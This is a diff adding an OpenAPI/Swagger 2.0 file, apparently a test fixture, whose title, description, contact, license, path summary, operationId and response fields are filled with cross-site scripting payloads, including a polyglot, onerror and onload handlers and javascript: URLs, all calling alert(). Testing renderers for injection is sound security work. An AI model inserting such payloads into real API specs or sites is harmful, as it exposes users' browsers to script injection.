@@ -1,0 +1,36 @@
+swagger: '2.0'
+info:
+  title: >
+    XSS test
+    alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
+  description: |
+    <svg/onload=alert('SVG')>
+    <img src=x onerror=alert('IMG')>
+    <iframe srcdoc="<script>alert('IFRAME')</script>"></iframe>
+    <math><mtext><script>alert('MATH')</script></mtext></math>
+    <video><source onerror="alert('VIDEO')"></video>
+    <details open ontoggle=alert('TOGGLE')>
+    <input autofocus onfocus=alert('FOCUS')>
+    <a href="javascript:alert('JS')">link</a>
+    &#x3C;img src=x onerror=alert('HTMLENC')&#x3E;
+    <!-- injection -->"><script>alert('HTML-CLOSE')</script>
+    <FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select>
+  version: "XSS-v1"
+  termsOfService: "javascript:alert('terms')"
+  contact:
+    name: "Attacker<script>alert('CONTACT')</script>"
+    email: "\" onmouseover=alert('email') x=\""
+  license:
+    name: "<script>alert('LICENSE')</script>"
+    url: "javascript:alert('LICENSE_URL')"
+paths:
+  /xss:
+    get:
+      summary: "<svg><desc><![CDATA[</desc><script>alert('XSS-summary')</script>]]></svg>"
+      description: "<iframe srcdoc='<script>alert(`XSS-path-desc`)</script>'></iframe>"
+      operationId: "xss<script>alert('OPID')</script>"
+      produces:
+        - application/json
+      responses:
+        '200':
+          description: "OK <img src=x onerror=alert('RESPONSE')>"
